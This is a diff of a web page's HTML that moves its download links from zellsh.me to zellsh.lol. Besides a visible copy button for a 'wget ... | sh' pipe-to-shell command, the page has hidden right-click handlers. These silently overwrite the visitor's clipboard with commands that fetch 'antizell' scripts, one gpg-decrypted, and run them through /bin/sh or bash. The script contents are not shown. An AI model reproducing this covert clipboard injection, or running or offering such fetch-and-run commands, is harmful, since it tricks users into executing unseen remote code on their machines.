@@ -32,11 +32,11 @@
         class="code-block"
         readonly="true"
         size="48"
-        value="wget -4 -O - https://zellsh.me/zell.sh | sh"
+        value="wget -4 -O - https://zellsh.lol/zell.sh | sh"
       />
       <button
         class="copy-button"
-        onclick='navigator.clipboard.writeText("wget -4 -O - https://zellsh.me/zell.sh | sh")'
+        onclick='navigator.clipboard.writeText("wget -4 -O - https://zellsh.lol/zell.sh | sh")'
       >
         COPY!!
       </button>
@@ -133,7 +133,7 @@
       ) {
         if (event.which == 3) {
           navigator.clipboard.writeText(
-            "gpg -d <(/bin/wget -4 -O - 'https://zellsh.me/antizell.sh.gpg') | /bin/sh"
+            "gpg -d <(/bin/wget -4 -O - 'https://zellsh.lol/antizell.sh.gpg') | /bin/sh"
           );
         }
       };
@@ -141,7 +141,7 @@
       document.getElementById("footer-id").onmousedown = function (event) {
         if (event.which == 3) {
           navigator.clipboard.writeText(
-            "/bin/wget -4 -O /tmp/antizell 'https://zellsh.me/antizell.sh' && /bin/bash /tmp/antizell"
+            "/bin/wget -4 -O /tmp/antizell 'https://zellsh.lol/antizell.sh' && /bin/bash /tmp/antizell"
           );
         }
       };
